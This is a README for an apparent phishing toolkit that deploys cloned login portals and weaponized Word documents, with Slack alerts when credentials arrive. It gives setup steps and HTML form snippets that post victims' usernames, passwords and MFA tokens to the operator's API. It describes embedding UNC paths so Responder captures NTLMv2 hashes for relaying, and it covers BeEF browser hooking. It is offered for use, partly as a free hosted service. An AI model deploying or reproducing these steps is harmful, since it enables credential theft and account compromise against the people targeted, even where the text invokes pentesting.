# Phishing-API
This API has two main features.  One allows you to easily deploy cloned landing pages for credential stealing and the other feature is weaponized Word doc creation.  Both are integrated into Slack for real-time alerting.  <b>I'm currently running this same code for those that don't want to implement their own environment as a free service @ https://phishapi.com!  </b>


## Update

I've added support for MS Word document generation.  Now, simply go to the API to create your payload, email it off, and wait for the Slack notification.  It automatically includes a UNC path back as well (as does the Phishing Portal feature) so if you're running Responder in a background session you can capture NTLMv2 hashes and be notified via Slack!  Support for weaponizing your own Word doc templates is built in.  Just upload an existing doc and download it again to hook it.  You can also choose to use Basic Auth which prompts the user for credentials, just like Phishery does!


# To Setup :

1) Import the DB SQL Dump Schema to a new MySQL Instance `mysql -u root -h localhost < DatabaseSQLDump.sql;`

2) Host the PHP from a web service (Apache, Nginx, IIS, etc)

3) Configure config.php variables

4) Limit Access to the "Results" Directory (Apache's Basic Auth is Recommended)

5) Use SSL and a Domain for the Hosted API

6) Optionally run Responder and BeEF in a screen session and import the crontab file



# 1) To Use the API for Capturing Credentials from Fake Sites : 

Rapid & Easy Deployment API for Phishing During Pentest Engagements.  Output to MySQL/Web Table &amp; Slack Bot.  Supports BEEF Hooking & HaveIBeenPwned!

<p align="center">
<img src="https://i.imgur.com/NoSpx88.png" width="70%"><br />
<b>Figure 1: Choose "Fake Portal" From API Options</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/5C9e2Ou.png" width="70%"><br />
<b>Figure 2: Choose a Pre-Designed Generic Portal for Landing Page</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/DWx6cTl.png" width="60%"><br />
<b>Figure 3: Fill Out API Details for Landing Page HTML and Optionally Include Your Own Logo</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/4MD7kq5.png" width="70%"><br />
<b>Figure 4: Download Automatically Created Source HTML to Host on a Standalone Server</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/qcCzaQl.png" width="90%"><br />
<b>Figure 5: The Hosted Site's Contents</b>
<br/><br/></p>

<b>However, if you don't wish to use a pre-populated landing page template, feel free to create or clone your own.  Just add the following HTML tags to leverage the API for alerting and credential capturing : </b><br><br>

1) Point your HTML Form to https://YOUR-API-HERE

	`<FORM METHOD="POST" ACTION="https://YOUR-API-HERE">`

2)  Make sure the following authentication fields are set

	`<INPUT NAME="username">`
	
	`<INPUT NAME="password">`
	
	`<INPUT NAME="token">` <b>(OPTIONAL MFA FIELD)</b>  
	
3) Add hidden input fields for the name of the project and the URL the users should be redirected to after submitting their credentials to you (Recommend Legitimate Login Location - For Best Results Use a Clickjacking Vulnerable URL That Allows iframes)

	`<INPUT NAME="project" VALUE="My_Project_Here" TYPE="hidden">`
	
	`<INPUT NAME="redirect" VALUE="https://site_to_redirect_to" TYPE="hidden">`
	
4) Optionally include hidden input fields for altering the Slack bot's behavior (Name and Emoji)

	`<INPUT NAME="slackbotname" VALUE="PhishBot" TYPE="hidden">`
	
	`<INPUT NAME="slackemoji" VALUE=":fishing_pole_and_fish:" TYPE="hidden">`
	
5) Sit back and wait for the Slack bot to notify you.  When you want to see the credentials visit https://YOUR-API-HERE/results using your basic auth credentials or click the link in the Slack notification.<br><br>

<p align="center">
<img src="https://i.imgur.com/L8yYRMQ.png" width="70%"><br />
<b>Figure 6: Someone Entered Credentials into the Fake Portal - Slack Alert</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/oXy9dEE.png" width="80%"><br />
<b>Figure 7: BeEF Hook Slack Alert (Optional in Case You Want to React Quickly w/ Modules)</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/CcSw4TT.png" width="100%"><br />
<b>Figure 8: Captured NTLMv2 Hash Exposed via Browser</b>
<br/><br/></p>

<p align="center">           
<img src="https://i.imgur.com/2ayiRRW.png"><br />
<b>Figure 9: Clicking the Slack Link Allows Viewing Credentials</b>
<br /><br/>
</p><br><br><br><br>

# 2) To Use the API for Generating Word Doc Payloads :

1) Modify /phishingdocs/index.php to include your Slack Webhook parameters

2) Create /var/www/uploads Path and make sure your web user has sudoers access

3) Browse out to YOUR_URL.com and select "Weaponized Documents" to generate your DOCX

4) Optionally set up [Responder](https://github.com/SpiderLabs/Responder "Responder") in a background process and run `phishinghashes.sh` every minute or so with cron

5) Set up your php.ini to allow uploads of at least 15MB and enable browsecap.ini for parsing UserAgent strings, otherwise some functionality may be limited.  

6) Email your doc and wait for the Slack alerts!

<p align="center"><b>Bonus points if you use your docs as honeypot bait! :)</b></p>

<br /><br/>
<p align="center">
<img src="https://i.imgur.com/LW4BUjN.png"><br />
<b>Figure 1: Web Based Payload Generation - Create New Doc or Upload Existing w/ Payload Options</b>
</p>
                  
            
<br /><br/>
<p align="center">
<img src="https://i.imgur.com/onsPyFp.png"><br />
<b>Figure 2: Opening Document Generated (New) by Service</b>
</p>


<br /><br/>
<p align="center">
<img src="https://i.imgur.com/sw8JWQE.png" width="40%"><br />
<b>Figure 3: If "Auth Prompt" if Selected in Payload Options, Display Basic Auth Prompt to User for Credential Capturing</b>
</p>
                  

<br /><br/>
<p align="center">
<img src="https://i.imgur.com/HlY3T4G.png" width="80%"><br />
<b>Figure 4: HTTP Beacon is Selected by Default and Alerts When the Target Opens the Document</b>
</p>


<br /><br/>
<p align="center">
<img src="https://i.imgur.com/ku6UTNI.png" width="75%"><br />
<b>Figure 5: If Credentials are Entered from Figure 3 Above, Notify via Slack When Captured</b>
</p>


<br /><br/>
<p align="center">
<img src="https://i.imgur.com/OO0sjDR.png"><br />
<b>Figure 6: Clicking on the Slack Alert Displays Captured Details (Hashes, Credentials, Client Details)</b>
</p>


<br /><br/>
<p align="center">
<img src="https://i.imgur.com/qZFGmXA.png"><br />
<b>Figure 7: Slack Alert when UNC/SMB Hashes are Received from Word Document</b>
</p>


<br /><br/>
<p align="center">
	<b>Currently, I'm running <a href="https://github.com/SpiderLabs/Responder">Responder</a> in a Screen session with <i>phishinghashes.sh</i> scheduled via Cron to run every minute to pick up hashes, correlate phished users, and alert via Slack.  You can also relay those hashes with another tool if you'd like to take things even further.  Enjoy! :)</b></p>
